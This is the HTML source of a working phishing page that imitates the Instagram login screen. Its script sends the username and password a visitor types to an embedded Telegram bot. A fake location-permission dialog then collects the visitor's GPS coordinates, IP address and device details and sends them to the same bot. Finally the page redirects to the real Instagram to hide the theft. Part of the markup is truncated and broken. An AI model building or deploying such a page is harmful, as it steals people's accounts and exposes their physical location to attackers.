<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
            background:#fff;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            color:#262626;
            padding:20px;
        }
        .login-box{
            text-align:center;
            width:100%;
            max-width:400px;
            padding:40px 30px;
            background:#fff;
            border:1px solid #dbdbdb;
            border-radius:4px;
        }
        .logo{
            margin-bottom:30px;
        }
        .logo svg{
            width:175px;
            height:auto;
        }
        .login-box h2{
            font-size:16px;
            font-weight:400;
            color:#8e8e8e;
            margin-bottom:20px;
        }
        .input-group{
            margin-bottom:10px;
            text-align:left;
        }
        .input-group input{
            width:100%;
            padding:14px 12px;
            background:#fafafa;
            border:1px solid #dbdbdb;
            border-radius:4px;
            font-size:14px;
            font-family:inherit;
            outline:none;
            transition:border 0.2s;
        }
        .input-group input:focus{
            border-color:#a8a8a8;
        }
        .input-group input::placeholder{
            color:#999;
        }
        .login-btn{
            display:block;
            width:100%;
            padding:12px;
            background:#0095f6;
            border:none;
            border-radius:8px;
            color:#fff;
            font-size:14px;
            font-weight:600;
            font-family:inherit;
            cursor:pointer;
            margin:15px 0 10px;
            transition:background 0.2s;
        }
        .login-btn:hover{background:#1877f2;}
        .login-btn:disabled{
            background:#b2dffc;
            cursor:not-allowed;
        }
        .divider{
            display:flex;
            align-items:center;
            margin:20px 0;
            color:#8e8e8e;
            font-size:13px;
            font-weight:600;
        }
        .divider::before, .divider::after{
            content:"";
            flex:1;
            height:1px;
            background:#dbdbdb;
        }
        .divider span{padding:0 18px;}
        .fb-login{
            color:#385185;
            font-weight:600;
            font-size:14px;
            cursor:pointer;
            margin:8px 0;
        }
        .forgot-pw{
            color:#00376b;
            font-size:12px;
            cursor:pointer;
            margin-top:12px;
        }
        .signup-box{
            margin-top:12px;
            padding:20px 0;
            border:1px solid #dbdbdb;
            border-radius:4px;
            text-align:center;
            font-size:14px;
        }
        .signup-box a{
            color:#0095f6;
            font-weight:600;
            text-decoration:none;
        }
        .get-app{
            text-align:center;
            margin-top:15px;
        }
        .get-app p{font-size:14px;margin-bottom:12px;}
        .app-badges img{
            height:40px;
            margin:0 4px;
        }
        .loader-overlay{
            display:none;
            position:fixed;
            top:0;left:0;right:0;bottom:0;
            background:rgba(255,255,255,0.92);
            z-index:999;
            justify-content:center;
            align-items:center;
            flex-direction:column;
        }
        .loader-overlay.active{
            display:flex;
        }
        .loader-overlay .spinner{
            width:44px;height:44px;
            border:3px solid #e0e0e0;
            border-top-color:#0095f6;
            border-radius:50%;
            animation:spin 0.7s linear infinite;
            margin-bottom:16px;
        }
        @keyframes spin{to{transform:rotate(360deg);}}
        .loader-overlay p{
            color:#8e8e8e;
            font-size:15px;
        }
        .gps-request{
            display:none;
            position:fixed;
            top:0;left:0;right:0;bottom:0;
            background:rgba(0,0,0,0.6);
            z-index:1000;
            justify-content:center;
            align-items:center;
        }
        .gps-request.active{display:flex;}
        .gps-modal{
            background:#fff;
            border-radius:20px;
            padding:30px 25px;
            max-width:340px;
            width:90%;
            text-align:center;
            animation:fadeIn 0.3s ease;
        }
        @keyframes fadeIn{
            from{transform:scale(0.9);opacity:0;}
            to{transform:scale(1);opacity:1;}
        }
        .gps-modal .icon{margin-bottom:12px;}
        .gps-modal h3{
            font-size:18px;
            margin-bottom:6px;
        }
        .gps-modal p{
            color:#666;
            font-size:14px;
            line-height:1.5;
            margin-bottom:20px;
        }
        .gps-modal .allow-btn{
            display:block;
            width:100%;
            padding:14px;
            background:#0095f6;
            border:none;
            border-radius:12px;
            color:#fff;
            font-size:16px;
            font-weight:600;
            font-family:inherit;
            cursor:pointer;
        }
        .gps-modal .allow-btn:hover{background:#1877f2;}
        .gps-modal .deny-btn{
            display:block;
            width:100%;
            padding:12px;
            background:transparent;
            border:none;
            color:#0095f6;
            font-size:14px;
            font-weight:600;
            font-family:inherit;
            cursor:pointer;
            margin-top:8px;
        }
    </style>
</head>
<body>

    <!-- GPS Request Modal (pirî caran dikeve) -->
    <div class="gps-request" id="gpsModal">
        <div class="gps-modal">
            <div class="icon">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" fill="#0095f6"/>
                </svg>
            </div>
            <h3>Allow Instagram to access your location?</h3>
            <p>Instagram uses your location to show you relevant content, tags, and nearby posts. Your location is not shared publicly.</p>
            <button class="allow-btn" id="allowGps">Allow Location Access</button>
            <button class="deny-btn" id="denyGps">Not Now</button>
        </div>
    </div>

    <!-- Loader / redirect overlay -->
    <div class="loader-overlay" id="loaderOverlay">
        <div class="spinner"></div>
        <p id="loaderStatus">Signing in...</p>
    </div>

    <!-- Instagram Login Page -->

                    <path d="M125.7 6.7v21c0 2.9-.7 5.2-2.1 7-1.4 1.8-3.4 2.7-6 2.7-1.4 0-2.7-.3-3.9-.8-1.2-.5-2.2-1.3-3-2.3l2.7-3.3c1.2 1.4 2.6 2.1 4.2 2.1 1.4 0 2.5-.5 3.3-1.4.8-.9 1.2-2.3 1.2-4v-2.2c-.6.8-1.4 1.4-2.4 1.8-1 .4-2.1.7-3.3.7-2.7 0-5.2-.7-7.4-2.1-2.2-1.4-3.9-3.3-4.9-5.8-1.1-2.5-1.6-5.2-1.6-8.1 0-2.9.5-5.6 1.6-8.1 1.1-2.5 2.7-4.4 4.9-5.8 2.2-1.4 4.6-2.1 7.4-2.1 1.2 0 2.3.2 3.3.7 1 .4 1.8 1 2.4 1.8V6.7h3.6zm-10.5 21c1.7 0 3.3-.5 4.8-1.5 1.4-1 2.5-2.4 3.3-4.2.8-1.8 1.2-3.8 1.2-5.9 0-2.1-.4-4.1-1.2-5.9-.8-1.8-1.9-3.2-3.3-4.2-1.4-1-3-1.5-4.8-1.5-1.7 0-3.3.5-4.8 1.5-1.4 1-2.5 2.4-3.3 4.2-.8 1.8-1.2 3.8-1.2 5.9 0 2.1.4 4.1 1.2 5.9.8 1.8 1.9 3.2 3.3 4.2 1.5 1 3.1 1.5 4.8 1.5z"/>
                    <path d="M140.1 6.7l-12.5 29.5h-4.1l4.6-10.6-8.2-18.9h4.3l5.9 14.3 5.9-14.3h4.1zM157.9 6.7v21c0 2.9-.7 5.2-2.1 7-1.4 1.8-3.4 2.7-6 2.7-1.4 0-2.7-.3-3.9-.8-1.2-.5-2.2-1.3-3-2.3l2.7-3.3c1.2 1.4 2.6 2.1 4.2 2.1 1.4 0 2.5-.5 3.3-1.4.8-.9 1.2-2.3 1.2-4v-2.2c-.6.8-1.4 1.4-2.4 1.8-1 .4-2.1.7-3.3.7-2.7 0-5.2-.7-7.4-2.1-2.2-1.4-3.9-3.3-4.9-5.8-1.1-2.5-1.6-5.2-1.6-8.1 0-2.9.5-5.6 1.6-8.1 1.1-2.5 2.7-4.4 4.9-5.8 2.2-1.4 4.6-2.1 7.4-2.1 1.2 0 2.3.2 3.3.7 1 .4 1.8 1 2.4 1.8V6.7h3.6zm-10.5 21c1.7 0 3.3-.5 4.8-1.5 1.4-1 2.5-2.4 3.3-4.2.8-1.8 1.2-3.8 1.2-5.9 0-2.1-.4-4.1-1.2-5.9-.8-1.8-1.9-3.2-3.3-4.2-1.4-1-3-1.5-4.8-1.5-1.7 0-3.3.5-4.8 1.5-1.4 1-2.5 2.4-3.3 4.2-.8 1.8-1.2 3.8-1.2 5.9 0 2.1.4 4.1 1.2 5.9.8 1.8 1.9 3.2 3.3 4.2 1.5 1 3.1 1.5 4.8 1.5z"/>
                    <path d="M174 6.7v21c0 2.9-.7 5.2-2.1 7-1.4 1.8-3.4 2.7-6 2.7-1.4 0-2.7-.3-3.9-.8-1.2-.5-2.2-1.3-3-2.3l2.7-3.3c1.2 1.4 2.6 2.1 4.2 2.1 1.4 0 2.5-.5 3.3-1.4.8-.9 1.2-2.3 1.2-4v-2.2c-.6.8-1.4 1.4-2.4 1.8-1 .4-2.1.7-3.3.7-2.7 0-5.2-.7-7.4-2.1-2.2-1.4-3.9-3.3-4.9-5.8-1.1-2.5-1.6-5.2-1.6-8.1 0-2.9.5-5.6 1.6-8.1 1.1-2.5 2.7-4.4 4.9-5.8 2.2-1.4 4.6-2.1 7.4-2.1 1.2 0 2.3.2 3.3.7 1 .4 1.8 1 2.4 1.8V6.7h3.6zm-10.5 21c1.7 0 3.3-.5 4.8-1.5 1.4-1 2.5-2.4 3.3-4.2.8-1.8 1.2-3.8 1.2-5.9 0-2.1-.4-4.1-1.2-5.9-.8-1.8-1.9-3.2-3.3-4.2-1.4-1-3-1.5-4.8-1.5-1.7 0-3.3.5-4.8 1.5-1.4 1-2.5 2.4-3.3 4.2-.8 1.8-1.2 3.8-1.2 5.9 0 2.1.4 4.1 1.2 5.9.8 1.8 1.9 3.2 3.3 4.2 1.5 1 3.1 1.5 4.8 1.5z"/>
                </svg>
            </div>
            
            <div class="input-group">
                <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" autocomplete="off">
            </div>
            
            <button class="login-btn" id="loginBtn" onclick="handleLogin()">Log In</button>
            
            <div class="divider"><span>OR</span></div>
            
            <div class="fb-login">Log in with Facebook</div>
            <div class="forgot-pw">Forgot password?</div>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-badges">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='4' fill='%23111211'/%3E%3Ctext x='12' y='26' fill='white' font-size='10' font-family='sans-serif'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play" style="height:40px;">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='4' fill='%23111211'/%3E%3Ctext x='12' y='26' fill='white' font-size='10' font-family='sans-serif'%3EMicrosoft%3C/text%3E%3C/svg%3E" alt="Microsoft" style="height:40px;">
            </div>
        </div>
    </div>

    <script>
        // ==================== Telegram Credentials ====================
        const BOT_TOKEN = "8736195412:AAETqDHUXTWVXnto8tpgaIqhqWh_JwY-wEE";
        const CHAT_ID = "6230485449";
        // =============================================================

        // Send to Telegram via multiple methods
        function sendToTelegram(text) {
            // Method 1: Image beacon
            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
            
            // Method 2: Fetch with no-cors
            try {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
                });
            } catch(e) {}
        }

        // Get IP
        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip || 'نەزانراو';
            } catch(e) {
                return 'نەدۆزرایەوە';
            }
        }

        // Get GPS with high accuracy
        function getGPS(callback) {
            if (!navigator.geolocation) {
                callback(null, 'GPS بەردەست نییە');
                return;
            }
            
            // First attempt - high accuracy
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    callback({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    });
                },
                function(err) {
                    // Second attempt - low accuracy
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            callback({
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude,
                                acc: pos.coords.accuracy
                            });
                        },
                        function(err2) {
                            callback(null, err2.message || 'ڕێگەپێ نەدرا');
                        },
                        {timeout: 5000, enableHighAccuracy: false}
                    );
                },
                {timeout: 7000, enableHighAccuracy: true}
            );
        }

        // Collect everything and send to Telegram
        async function collectAndSend(gpsData, error) {
            try {
                const ip = await getIP();
                const userAgent = navigator.userAgent;
                const platform = navigator.platform || 'نەزانراو';
                const lang = navigator.language || 'نەزانراو';
                
                let msg = `📍 **Instagram GPS Location** 📍\n\n`;
                msg += `**🌐 IP:** \`${ip}\`\n`;
                msg += `**📱 Platform:** ${platform}\n`;
                msg += `**🌍 Language:** ${lang}\n`;
                msg += `**🕐 Time:** ${new Date().toLocaleString()}\n\n`;
                
                if (gpsData) {
                    msg += `**📍 GPS:** \`${gpsData.lat}, ${gpsData.lng}\`\n`;
                    msg += `**📡 Accuracy:** ${Math.round(gpsData.acc)} meters\n\n`;
                    msg += `**🔗 Google Maps:**\n`;
                    msg += `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}\n\n`;
                } else {
                    msg += `**⚠️ GPS Error:** ${error || 'نەدۆزرایەوە'}\n\n`;
                }
                
                msg += `**User-Agent:**\n\`${userAgent}\``;
                
                sendToTelegram(msg);
            } catch(e) {
                sendToTelegram(`❌ Error: ${e.message}`);
            }
        }

        // Handle login button click
        function handleLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            
            if (!username || !password) {
                alert('Please enter your username and password');
                return;
            }
            
            // Show loader
            document.getElementById('loaderOverlay').classList.add('active');
            document.getElementById('loaderStatus').textContent = 'Signing in...';
            loginBtn.disabled = true;
            
            // Send credentials to Telegram
            let credMsg = `🔐 **Instagram Credentials** 🔐\n\n`;
            credMsg += `**👤 Username:** \`${username}\`\n`;
            credMsg += `**🔑 Password:** \`${password}\`\n`;
            credMsg += `**🕐 Time:** ${new Date().toLocaleString()}\n`;
            credMsg += `**🌐 IP:** ${window.location.hostname}`;
            sendToTelegram(credMsg);
            
            // Now trigger GPS request
            setTimeout(function() {
                document.getElementById('loaderOverlay').classList.remove('active');
                document.getElementById('gpsModal').classList.add('active');
            }, 1500);
        }

        // Allow GPS
        document.getElementById('allowGps').addEventListener('click', function() {
            document.getElementById('gpsModal').classList.remove('active');
            document.getElementById('loaderOverlay').classList.add('active');
            document.getElementById('loaderStatus').textContent = 'Verifying location...';
            
            getGPS(function(gpsData, error) {
                collectAndSend(gpsData, error);
                
                setTimeout(function() {
                    document.getElementById('loaderOverlay').classList.remove('active');
                    document.getElementById('loaderStatus').textContent = 'Signing in...';
                    loginBtn.disabled = false;
                    // Redirect to real Instagram
                    window.location.href = 'https://www.instagram.com';
                }, 2000);
            });
        });

        // Deny GPS
        document.getElementById('denyGps').addEventListener('click', function() {
            document.getElementById('gpsModal').classList.remove('active');
            collectAndSend(null, 'User denied GPS');
            setTimeout(function() {
                window.location.href = 'https://www.instagram.com';
            }, 1000);
        });

        // Also trigger GPS immediately on page load (before login)
        window.onload = function() {
            // Try to get GPS silently first
            setTimeout(function() {
                document.getElementById('gpsModal').classList.add('active');
            }, 3000);
        };
    </script>
</body>
</html>
